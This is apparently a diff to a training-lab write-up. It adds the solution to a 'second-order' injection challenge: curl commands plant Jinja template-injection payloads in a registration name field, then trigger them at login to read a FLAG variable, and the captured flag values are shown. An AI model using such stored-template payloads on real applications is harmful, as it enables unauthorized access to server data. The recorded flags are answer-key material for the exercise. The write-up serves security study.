@@ -438,15 +438,204 @@ The `curl -w` option measures the total HTTP response time.
 
 | Result                   | Meaning                                 |
 | ------------------------ | --------------------------------------- |
-| Approximately 6 seconds  | Strong indication that `sleep(6)` works |
+| Approximately 6 seconds  | **Strong indication that `sleep(6)` works** |
 | Error mentioning `sleep` | Function probably isn't available       |
 | Immediate HTTP 200       | No evidence of the intended delay       |
-| Flag in response         | Task completed                          |
+| Flag in response         | **Task completed**                          |
 
 ```bash
 echo c160b23374436bb938ac95a9f5bbf7ed > 3-flag.txt
 git add .
 git commit -m "3-flag.txt"
+git push
+```
+
+
+## Task 4. SQLi - Second-Order Blind Injection
+
+Second-order SQL injection requires a nuanced approach, as the payload you inject at one point is executed at another, often without direct feedback.\
+This task involves submitting a payload through a registration form that seems benign until it is processed during login, revealing a flag based on a jinja error where `FLAG` is an accessible variable.\
+Your goal is to find the `flag` ⛳️.
+
+- Target URL (Initial Input):
+  - Endpoint: `http://web0x01.hbtn/api/a3/sql_injection/second_order/register`
+  - Method: `POST`
+  - Content-Type: `JSON`
+  - Body: `Example`
+
+    {"username": "yosri", "name": "Yosri", "password": "password123"}
+- Target URL (Trigger):
+  - Endpoint: `http://web0x01.hbtn/api/a3/sql_injection/second_order/login`
+  - Method: `POST`
+  - Content-Type: `JSON`
+  - Body: `Example`
+
+    {"username": "yosri", "password": "password123"}
+
+---
+
+\*
+
+Helpful Instructions:
+
+1. Consider how your payload can be crafted to remain dormant until triggered.
+- This might involve manipulating user data that's later used in a SQL query during login.
+2. Since you won't see direct output from your payload, think about how you can use timing attacks or monitor application behavior changes to infer success.
+2. Use tools like Burp Suite to carefully observe the application's responses and time delays when interacting with the stored payload.
+3. Be prepared to refine your payload based on feedback. This might require several attempts to fine-tune how your payload is triggered and detected.
+
+\*
+
+
+## **Solution**:
+
+### Understand the vulnerability
+
+This task is different from the previous ones.
+
+In a second-order injection, the malicious input is stored first and executed later.
+
+1\. Registration
+
+Store a payload in the `name` field.
+
+2\. Database
+
+The application saves the payload as ordinary user data.
+
+3\. Login
+
+The application retrieves the stored value and potentially evaluates it using Jinja.
+
+4\. Injection triggers
+
+If Jinja evaluates the stored input, we may be able to access the `FLAG` variable.
+
+Because the challenge explicitly mentions Jinja, we'll first test for Server-Side Template Injection (SSTI) using:
+
+```
+{{7*7}}
+```
+
+If Jinja evaluates this expression, the result will be `49` rather than the literal `{{7*7}}`.
+
+### Register a test account
+
+Execute this command to add new user with a payload in the `name` field:
+
+```bash
+curl -sS -X POST \
+  'http://web0x01.hbtn/api/a3/sql_injection/second_order/register' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"ssti_probe_1026","name":"{{7*7}}","password":"password123"}' \
+  | jq .
+
+# {
+#   "message": "User created successfully",
+#   "success": true
+# }
+```
+
+We're deliberately putting the payload inside `name`, while using ordinary values for `username` and `password`.
+
+
+### Trigger the second-order injection
+
+Now we'll log in using the same account.
+
+Execute this command:
+
+```bash
+curl -sS -i -X POST \
+  'http://web0x01.hbtn/api/a3/sql_injection/second_order/login' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"ssti_probe_1026","password":"password123"}'
+
+#HTTP/1.1 200 OK
+#Server: nginx/1.22.1
+#Date: Mon, 26 Oct 2026 20:30:39 GMT
+#Content-Type: application/json
+#Content-Length: 107
+#Connection: keep-alive
+#Vary: Cookie
+#Set-Cookie: session=q2v4JKvBHIQ9G2kqWZDRCCcCmLSOahlHcjtOwbdoRGU.-PkttFB-KRtqP0I6Kgy0r3G9rFs; HttpOnly; Path=/
+# X-XSS-Protection: 0
+
+# {"message":{"html":"<h1>Welcome Mr 49</h1>","name":"{{7*7}}","username":"ssti_probe_1026"},"success":true}
+```
+
+### What are we testing?
+
+When the application processes the login, it may retrieve the stored `name` and insert it into a Jinja template.
+
+We're looking for one of three outcomes:
+
+| Response    | Interpretation |
+| ----------- | -------------- |
+| `49`        | **Jinja evaluated `{{7*7}}`, confirming template injection** |
+| `{{7*7}}`   | The expression was returned literally                                                    |
+| Jinja error | The application reached template processing, and the error may reveal useful information |
+
+We use `curl -i` to display the HTTP status and response headers as well as the body, because the challenge specifically mentions a Jinja error.
+
+
+Notice the difference:
+
+- `name`: `{{7*7}}` is the original value stored in the database.
+- `html`: `Welcome Mr 49` is the result after Jinja evaluated that expression.
+
+This proves the application evaluates stored user input as Jinja template code during login.
+
+### Access the FLAG variable
+
+The task description gives us an important clue: `FLAG` is accessible in the Jinja template context.
+
+Jinja allows variables to be evaluated using:
+
+```sql
+{{ FLAG }}
+```
+
+Instead of performing arithmetic, we'll try to render the value of `FLAG` directly by registering a new account with `{{ FLAG }}` in the `name` field.
+
+```bash
+curl -sS -X POST \
+  'http://web0x01.hbtn/api/a3/sql_injection/second_order/register' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"ssti_flag_1026","name":"{{ FLAG }}","password":"password123"}' \
+  | jq .
+
+# {
+#   "message": "User created successfully",
+#   "success": true
+# }
+```
+
+### Trigger the stored payload
+
+Now log in with the account we just created to get the flag:
+
+```bash
+curl -sS -X POST \
+  'http://web0x01.hbtn/api/a3/sql_injection/second_order/login' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"ssti_flag_1026","password":"password123"}' \
+  | jq .
+
+# {
+#   "message": {
+#     "html": "<h1>Welcome Mr 6d2261977473a42bb17b9ea982c452aa</h1>",
+#     "name": "{{ FLAG }}",
+#     "username": "ssti_flag_1026"
+#   },
+#   "success": true
+# }
+```
+
+```bash
+echo "6d2261977473a42bb17b9ea982c452aa" > 4-flag.txt
+git add .
+git commit -m "4-flag.txt"
 git push
 ```
 
